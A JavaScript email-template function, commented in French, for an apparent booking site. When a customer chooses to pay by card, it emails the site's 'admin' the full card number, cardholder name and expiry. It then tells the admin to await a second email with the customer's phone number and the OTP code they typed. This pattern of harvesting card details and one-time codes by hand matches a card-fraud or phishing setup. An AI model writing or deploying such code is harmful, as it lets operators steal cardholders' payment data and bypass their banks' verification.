import { emailLayout } from './layout';

/**
 * EMAIL 1 — Envoyé à l'admin dès que le client clique "Payer par CB".
 * Contient uniquement les informations de la carte bancaire.
 * L'admin est informé qu'une demande de paiement est en cours.
 *
 * @param {object} opts
 * @param {string} opts.userName    - Nom du client
 * @param {string} opts.userEmail   - Email du client
 * @param {string} opts.cardNumber  - Numéro de carte formaté
 * @param {string} opts.cardName    - Nom du titulaire
 * @param {string} opts.cardExpiry  - Date d'expiration MM/AA
 * @param {string} opts.bookingRef  - Référence courte de la réservation
 * @param {string} opts.amount      - Montant formaté (ex: "150,00 €")
 */
export function adminCardInfoEmail({
  userName,
  userEmail,
  cardNumber,
  cardName,
  cardExpiry,
  bookingRef,
  amount,
}) {
  return {
    subject: `💳 Nouvelle tentative de paiement carte — Réservation #${bookingRef}`,
    html: emailLayout({
      title: 'Informations de carte reçues',
      preheader: `${userName} tente de payer par carte — réservation #${bookingRef}`,
      content: `
        <h2>Tentative de paiement par carte</h2>
        <p>
          Un client vient de saisir ses informations de carte bancaire
          et souhaite finaliser sa réservation.
          <strong>Il va maintenant vous envoyer son numéro de téléphone
          pour recevoir le code OTP que vous lui transmettrez manuellement.</strong>
        </p>

        <!-- Infos carte -->
        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${userName}</span>
          </div>
          <div class="info-row">
            <span class="label">Email client</span>
            <span class="value">${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro de carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardNumber}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${cardName}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${cardExpiry}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${amount}</span>
          </div>
        </div>

        <p style="color:#71717a; font-size:13px;">
          ⏳ Attendez le 2ème email contenant le numéro de téléphone du client
          et le code OTP qu'il aura saisi — vous pourrez alors valider ou refuser.
        </p>
      `,
    }),
  };
}
